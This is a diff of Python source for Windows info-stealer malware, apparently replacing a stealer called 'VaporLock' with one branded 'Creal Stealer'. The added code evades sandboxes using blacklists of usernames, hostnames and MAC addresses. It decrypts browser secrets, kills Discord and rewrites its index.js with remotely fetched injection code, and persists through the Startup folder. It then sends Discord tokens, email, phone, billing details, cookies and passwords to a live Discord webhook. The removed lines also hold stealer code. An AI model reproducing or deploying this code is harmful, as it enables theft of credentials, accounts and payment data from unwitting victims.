@@ -1,1411 +1,1019 @@
-import shutil, requests, platform, socket, getpass, psutil, browser_cookie3, os, re, sys, subprocess, ctypes, json, base64, sqlite3, zipfile, random, cv2, time
+import os
+import threading
+from sys import executable
+from sqlite3 import connect as sql_connect
+import re
+from base64 import b64decode
+from json import loads as json_loads, load
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from urllib.request import Request, urlopen
+from json import *
+import time
+import shutil
+from zipfile import ZipFile
+import random
+import re
+import subprocess
+import sys
+import shutil
+import uuid
+import socket
+import getpass
 
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from win32crypt import CryptUnprotectData
-from Cryptodome.Cipher import AES
-from contextlib import suppress
-from pathlib import Path
 
 
-class Paths:
-    def __init__(self):
-        self.temp = Path(os.environ["TEMP"])
-        self.windows = os.environ.get("WINDIR")
-        self.userprofile = Path(os.environ["USERPROFILE"])
-        self.appdata_local = Path(os.environ["LOCALAPPDATA"])
-        self.appdata_roaming = Path(os.environ["APPDATA"])
-        
-        program_files = os.environ.get("ProgramFiles")
-        program_files_x86 = os.environ.get("ProgramFiles(x86)")
-        self.program_files = Path(program_files or program_files_x86)
-        self.program_files_x86 = Path(program_files_x86)
+blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
+
+username = getpass.getuser()
+
+if username.lower() in blacklistUsers:
+    os._exit(0)
+
+def kontrol():
+
+    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
+
+    hostname = socket.gethostname()
+
+    if any(name in hostname for name in blacklistUsername):
+        os._exit(0)
+
+kontrol()
+
+BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
+
+mac_address = uuid.getnode()
+if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
+    os._exit(0)
 
 
-class Malware:
-    def __init__(self):
-        self.zip_name = f"VL_{random.randint(10000000000, 99999999999)}.zip"
-        self.webhook_url = "https://discord.com/api/webhooks/1511991915837653073/EF6XRpVKlGvYdNHbXfdnQWqkXJSnNfSFMBxSYOLpRL1CDfQi0IVTqzsD_W8FfRfou6yx"
-        self.stealer_version = "0.0.0"
-        self.malware_name = "VaporLock"
-        self.malware_author = "https://guns.lol/croxlv"
-        self.browser_infos = ["Uzantılar", "Şifreler", "Kurabiyeler", "Geçmişler", "İndirmeler", "Kartlar"]
-        self.session_files = ["Cüzdanlar", "Oyun Başlatıcıları", "Uygulamalar"]
-        self.task_manager_blocked = False
+
+
+wh00k = "https://discord.com/api/webhooks/1511991915837653073/EF6XRpVKlGvYdNHbXfdnQWqkXJSnNfSFMBxSYOLpRL1CDfQi0IVTqzsD_W8FfRfou6yx"
+inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
     
-    def delete_file(self, file_path):
+DETECTED = False
+#guns.lol/croxlv
+def g3t1p():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
+
+requirements = [
+    ["requests", "requests"],
+    ["Crypto.Cipher", "pycryptodome"],
+]
+for modl in requirements:
+    try: __import__(modl[0])
+    except:
+        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
+        time.sleep(3)
+
+import requests
+from Crypto.Cipher import AES
+
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+temp = os.getenv("TEMP")
+Threadlist = []
+
+
+class DATA_BLOB(Structure):
+    _fields_ = [
+        ('cbData', wintypes.DWORD),
+        ('pbData', POINTER(c_char))
+    ]
+
+def G3tD4t4(blob_out):
+    cbData = int(blob_out.cbData)
+    pbData = blob_out.pbData
+    buffer = c_buffer(cbData)
+    cdll.msvcrt.memcpy(buffer, pbData, cbData)
+    windll.kernel32.LocalFree(pbData)
+    return buffer.raw
+
+def CryptUnprotectData(encrypted_bytes, entropy=b''):
+    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
+    buffer_entropy = c_buffer(entropy, len(entropy))
+    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
+    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
+    blob_out = DATA_BLOB()
+
+    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
+        return G3tD4t4(blob_out)
+
+def D3kryptV4lU3(buff, master_key=None):
+    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+    if starts == 'v10' or starts == 'v11':
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+
+def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
+    for i in range(8): # max trys
         try:
-            if os.path.isfile(file_path):
-                os.remove(file_path)
-            elif os.path.isdir(file_path):
-                shutil.rmtree(file_path)
-        except Exception:
+            if methode == 'POST':
+                if data != '':
+                    r = requests.post(url, data=data)
+                    if r.status_code == 200:
+                        return r
+                elif files != '':
+                    r = requests.post(url, files=files)
+                    if r.status_code == 200 or r.status_code == 413:
+                        return r
+        except:
             pass
 
-    def startup_persistence(self):
+def L04durl1b(wh00k, data='', files='', headers=''):
+    for i in range(8):
         try:
-            src = os.path.abspath(sys.argv[0])
-            dst_dir = os.path.join(Paths().appdata_roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-            dst = os.path.join(dst_dir, os.path.basename(src))
-
-            if not os.path.exists(dst_dir):
-                os.makedirs(dst_dir)
-
-            if not os.path.exists(dst):
-                shutil.copy2(src, dst)
-        except Exception:
+            if headers != '':
+                r = urlopen(Request(wh00k, data=data, headers=headers))
+                return r
+            else:
+                r = urlopen(Request(wh00k, data=data))
+                return r
+        except: 
             pass
 
-    def block_task_manager(self):
-        try:
-            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
-            registry = ctypes.windll.advapi32.RegCreateKeyExW
-            hkey = ctypes.c_void_p()
-            result = registry(ctypes.c_void_p(0x80000002), key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
-            if result == 0:
-                value = ctypes.c_uint32(1)
-                ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4)
-                ctypes.windll.advapi32.RegCloseKey(hkey)
-        except Exception:
-            pass
+def globalInfo():
+    ip = g3t1p()
+    us3rn4m1 = os.getenv("USERNAME")
+    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
+    # print(ipdatanojson)
+    ipdata = loads(ipdatanojson)
+    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
+    contry = ipdata["country_name"]
+    contryCode = ipdata["country_code"].lower()
+    sehir = ipdata["state"]
 
-    def unblock_task_manager(self):
-        try:
-            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
-            registry = ctypes.windll.advapi32.RegCreateKeyExW
-            hkey = ctypes.c_void_p()
-            result = registry(ctypes.c_void_p(0x80000002), key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
-            if result == 0:
-                value = ctypes.c_uint32(0)
-                ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4)
-                ctypes.windll.advapi32.RegCloseKey(hkey)
-        except Exception:
-            pass
+    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
+    return globalinfo
 
-    def send_webhook(self, gofile_url=None, file_path=None):
-        try:
-            embed = {
-                "title": "<a:pinkcrown:996004209667346442> Sistem bilgileri:",
-                "color": 0xE53935,
-                "fields": [
-                    {"name": "Ana makine adi:", "value": f"```{socket.gethostname()}```", "inline": True},
-                    {"name": "Isim:", "value": f"```{getpass.getuser()}```", "inline": True},
-                    {"name": "Makine:", "value": f"```{platform.machine()}```", "inline": True},
-                    {"name": "Sistem:", "value": f"```{platform.system()}```", "inline": True},
-                    {"name": "Surum:", "value": f"```{platform.release()}```", "inline": True},
-                    {"name": "Versiyon:", "value": f"```{platform.version()}```", "inline": True},
-                ],
-                "footer": {
-                    "text": "Im returning by death. | @Croxlv"
-                }
-            }
 
-            components = [
+def TR6st(C00k13):
+    # simple Trust Factor system
+    global DETECTED
+    data = str(C00k13)
+    tim = re.findall(".google.com", data)
+    # print(len(tim))
+    if len(tim) < -1:
+        DETECTED = True
+        return DETECTED
+    else:
+        DETECTED = False
+        return DETECTED
+        
+def G3tUHQFr13ndS(t0k3n):
+    b4dg3List =  [
+        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
+        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
+        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
+        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
+        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
+        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
+        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
+        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
+        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
+        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
+    ]
+    headers = {
+        "Authorization": t0k3n,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    try:
+        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
+    except:
+        return False
+
+    uhqlist = ''
+    for friend in friendlist:
+        Own3dB3dg4s = ''
+        flags = friend['user']['public_flags']
+        for b4dg3 in b4dg3List:
+            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
+                if not "House" in b4dg3["Name"]:
+                    Own3dB3dg4s += b4dg3["Emoji"]
+                flags = flags % b4dg3["Value"]
+        if Own3dB3dg4s != '':
+            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
+    return uhqlist
+
+
+process_list = os.popen('tasklist').readlines()
+
+
+for process in process_list:
+    if "Discord" in process:
+        
+        pid = int(process.split()[1])
+        os.system(f"taskkill /F /PID {pid}")
+
+def G3tb1ll1ng(t0k3n):
+    headers = {
+        "Authorization": t0k3n,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    try:
+        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
+    except:
+        return False
+    
+    if b1ll1ngjson == []: return "```None```"
+
+    b1ll1ng = ""
+    for methode in b1ll1ngjson:
+        if methode["invalid"] == False:
+            if methode["type"] == 1:
+                b1ll1ng += ":credit_card:"
+            elif methode["type"] == 2:
+                b1ll1ng += ":parking: "
+
+    return b1ll1ng
+
+def inj_discord():
+
+    username = os.getlogin()
+
+    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
+
+    for folder_name in folder_list:
+        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
+        if os.path.isdir(deneme_path):
+            for subdir, dirs, files in os.walk(deneme_path):
+                if 'app-' in subdir:
+                    for dir in dirs:
+                        if 'modules' in dir:
+                            module_path = os.path.join(subdir, dir)
+                            for subsubdir, subdirs, subfiles in os.walk(module_path):
+                                if 'discord_desktop_core-' in subsubdir:
+                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
+                                        if 'discord_desktop_core' in subsubsubdir:
+                                            for file in subsubfiles:
+                                                if file == 'index.js':
+                                                    file_path = os.path.join(subsubsubdir, file)
+
+                                                    inj_content = requests.get(inj_url).text
+
+                                                    inj_content = inj_content.replace("%WEBHOOK%", wh00k)
+
+                                                    with open(file_path, "w", encoding="utf-8") as index_file:
+                                                        index_file.write(inj_content)
+inj_discord()
+
+def G3tB4dg31(flags):
+    if flags == 0: return ''
+
+    Own3dB3dg4s = ''
+    b4dg3List =  [
+        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
+        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
+        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
+        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
+        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
+        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
+        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
+        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
+        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
+        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
+    ]
+    for b4dg3 in b4dg3List:
+        if flags // b4dg3["Value"] != 0:
+            Own3dB3dg4s += b4dg3["Emoji"]
+            flags = flags % b4dg3["Value"]
+
+    return Own3dB3dg4s
+
+def G3tT0k4n1nf9(t0k3n):
+    headers = {
+        "Authorization": t0k3n,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+
+    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
+    us3rn4m1 = us3rjs0n["username"]
+    hashtag = us3rjs0n["discriminator"]
+    em31l = us3rjs0n["email"]
+    idd = us3rjs0n["id"]
+    pfp = us3rjs0n["avatar"]
+    flags = us3rjs0n["public_flags"]
+    n1tr0 = ""
+    ph0n3 = ""
+
+    if "premium_type" in us3rjs0n: 
+        nitrot = us3rjs0n["premium_type"]
+        if nitrot == 1:
+            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
+        elif nitrot == 2:
+            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
+    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'
+
+    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3
+
+def ch1ckT4k1n(t0k3n):
+    headers = {
+        "Authorization": t0k3n,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    try:
+        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
+        return True
+    except:
+        return False
+
+if getattr(sys, 'frozen', False):
+    currentFilePath = os.path.dirname(sys.executable)
+else:
+    currentFilePath = os.path.dirname(os.path.abspath(__file__))
+
+fileName = os.path.basename(sys.argv[0])
+filePath = os.path.join(currentFilePath, fileName)
+
+startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+startupFilePath = os.path.join(startupFolderPath, fileName)
+
+if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
+    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
+        shutil.copyfileobj(src_file, dst_file)
+
+
+def upl05dT4k31(t0k3n, path):
+    global wh00k
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)
+
+    if pfp == None: 
+        pfp = "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+    else:
+        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
+
+    b1ll1ng = G3tb1ll1ng(t0k3n)
+    b4dg3 = G3tB4dg31(flags)
+    friends = G3tUHQFr13ndS(t0k3n)
+    if friends == '': friends = "```No Rare Friends```"
+    if not b1ll1ng:
+        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
+    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"
+
+    data = {
+        "content": f'{globalInfo()} | `{path}`',
+        "embeds": [
+            {
+            "color": 2895667,
+            "fields": [
                 {
-                    "type": 1,
-                    "components": [
-                        {
-                            "type": 2,              
-                            "style": 5,                    
-                            "label": "Dosya Indir",       
-                            "url": gofile_url        
-                        },
-                        {
-                            "type": 2,              
-                            "style": 5,                    
-                            "label": "GunsLol",       
-                            "url": "https://guns.lol/croxlv"        
-                        }
-                    ]
+                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
+                    "value": f"```{t0k3n}```",
+                    "inline": True
+                },
+                {
+                    "name": "<:mail:750393870507966486> Email:",
+                    "value": f"```{em31l}```",
+                    "inline": True
+                },
+                {
+                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
+                    "value": f"```{ph0n3}```",
+                    "inline": True
+                },
+                {
+                    "name": "<:mc_earth:589630396476555264> IP:",
+                    "value": f"```{g3t1p()}```",
+                    "inline": True
+                },
+                {
+                    "name": "<:woozyface:874220843528486923> Badges:",
+                    "value": f"{n1tr0}{b4dg3}",
+                    "inline": True
+                },
+                {
+                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
+                    "value": f"{b1ll1ng}",
+                    "inline": True
+                },
+                {
+                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
+                    "value": f"{friends}",
+                    "inline": False
                 }
-            ]
-
-            payload = {
-                "username": self.malware_name,
-                "embeds": [embed],
-                "components": components
+                ],
+            "author": {
+                "name": f"{us3rn4m1}#{hashtag} ({idd})",
+                "icon_url": f"{pfp}"
+                },
+            "footer": {
+                "text": "Creal Stealer",
+                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                },
+            "thumbnail": {
+                "url": f"{pfp}"
+                }
             }
+        ],
+        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+        "username": "Creal Stealer",
+        "attachments": []
+        }
+    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
 
-            if file_path and os.path.exists(file_path):
-                with open(file_path, "rb") as f:
-                    files = {"file": (os.path.basename(file_path), f)}
-                    requests.post(self.webhook_url + "?with_components=true", data={"payload_json": json.dumps(payload)}, files=files)
-            else:
-                requests.post(self.webhook_url + "?with_components=true", json=payload)
+#hersey son defa :(
+def R4f0rm3t(listt):
+    e = re.findall("(\w+[a-z])",listt)
+    while "https" in e: e.remove("https")
+    while "com" in e: e.remove("com")
+    while "net" in e: e.remove("net")
+    return list(set(e))
 
-        except Exception as e:
-            print("Erro:", e)
+def upload(name, link):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
 
-    def upload_gofile(self, file_path):
-        try:
-            with open(file_path, "rb") as f:
-                files = {"file": f}
-                response = requests.post(f"https://upload.gofile.io/uploadFile", files=files)
-                if response.status_code == 200:
-                    result = response.json()
-                    if result.get("status") == "ok":
-                        return result["data"]["downloadPage"]
-            return None
-        except Exception as e:
-            return None
+    if name == "crcook":
+        rb = ' | '.join(da for da in cookiWords)
+        if len(rb) > 1000: 
+            rrrrr = R4f0rm3t(str(cookiWords))
+            rb = ' | '.join(da for da in rrrrr)
+        data = {
+            "content": f"{globalInfo()}",
+            "embeds": [
+                {
+                    "title": "Creal | Cookies Stealer",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
+                    "color": 2895667,
+                    "footer": {
+                        "text": "Creal Stealer",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                    }
+                }
+            ],
+            "username": "Creal Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "attachments": []
+            }
+        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
+        return
 
-    def start_stealer(self, zip_file):
-        try:
-            try:
-                interesting_files = StealerFunctions.Interesting_Files(zip_file)
-                print("İlgili dosyalar toplandı:", interesting_files)
-            except:
-                print("İlgili dosyalar toplanırken hata.")
-            try:
-                screenshot_taken = StealerFunctions.Screenshot(zip_file)
-                print("Ekran görüntüsü toplandı:", screenshot_taken)
-            except:
-                print("Ekran görüntüsü toplanırken hata.")
-            try:
-                antivirus_count = StealerFunctions.AntiVirus_Infos(zip_file)
-                print("Antivirüs bilgisi toplandı:", antivirus_count)
-            except:
-                print("Antivirüs bilgisi toplanırken hata.")
-            try:
-                discord_tokens = StealerFunctions.Discord_Tokens(zip_file)
-                print("Discord token toplandı:", discord_tokens)
-            except:
-                print("Discord token toplanırken hata.")
-            try:
-                roblox_cookies = StealerFunctions.Roblox_Cookies(zip_file)
-                print("Roblox kurabiyesi toplandı:", roblox_cookies)
-            except:
-                print("Roblox kurabiyesi toplanırken hata.")
-            try:
-                session_files = StealerFunctions.Session_files(zip_file, self.session_files)
-                print("Oturum dosyaları toplandı:", session_files)
-            except:
-                print("Oturum dosyaları toplanırken hata.")
-            try:
-                browser_Infos = StealerFunctions.Browser_Infos(zip_file, self.browser_infos)
-                print("Tarayıcı bilgileri toplandı:", browser_Infos)
-            except:
-                print("Tarayıcı bilgileri toplanırken hata.")
-            try:
-                webcam_taken = StealerFunctions.Webcam(zip_file)
-                print("Kamera fotoğrafı toplandı:", webcam_taken)
-            except:
-                print("Kamera fotoğrafı toplanırken hata.")
-            try:
-                system_infos = StealerFunctions.System_Infos(zip_file)
-                print("Sistem bilgisi toplandı:", system_infos)
-            except:
-                print("Sistem bilgisi toplanırken hata.")
+    if name == "crpassw":
+        ra = ' | '.join(da for da in paswWords)
+        if len(ra) > 1000: 
+            rrr = R4f0rm3t(str(paswWords))
+            ra = ' | '.join(da for da in rrr)
 
-            return True
-        except Exception as e:
-            print('Exeption (start_stealer): ', e)
-            return False
+        data = {
+            "content": f"{globalInfo()}",
+            "embeds": [
+                {
+                    "title": "Creal | Password Stealer",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
+                    "color": 2895667,
+                    "footer": {
+                        "text": "Creal Stealer",
